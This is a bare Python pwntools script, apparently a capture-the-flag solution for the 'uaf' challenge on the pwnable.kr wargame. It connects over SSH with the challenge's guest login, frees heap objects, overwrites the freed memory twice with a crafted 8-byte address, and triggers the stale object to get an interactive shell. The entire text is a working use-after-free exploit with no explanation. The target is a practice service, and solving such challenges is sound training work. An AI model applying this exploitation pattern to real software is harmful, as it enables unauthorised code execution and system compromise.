from pwn import *
s = ssh(host='pwnable.kr', port=2222,
        user='uaf',
        password='guest')
context.log_level = 'debug'
a = s.process(["./uaf", "24", "/dev/stdin"])
a.recv(1024)
a.sendline("3")
a.recv(1024)
a.sendline("2")
a.send("\x68\x15\x40\x00\x00\x00\x00\x00")
a.recvuntil('free\n')
a.sendline("2")
a.send("\x68\x15\x40\x00\x00\x00\x00\x00")
a.recvuntil('free\n')
a.sendline("1")
a.interactive()
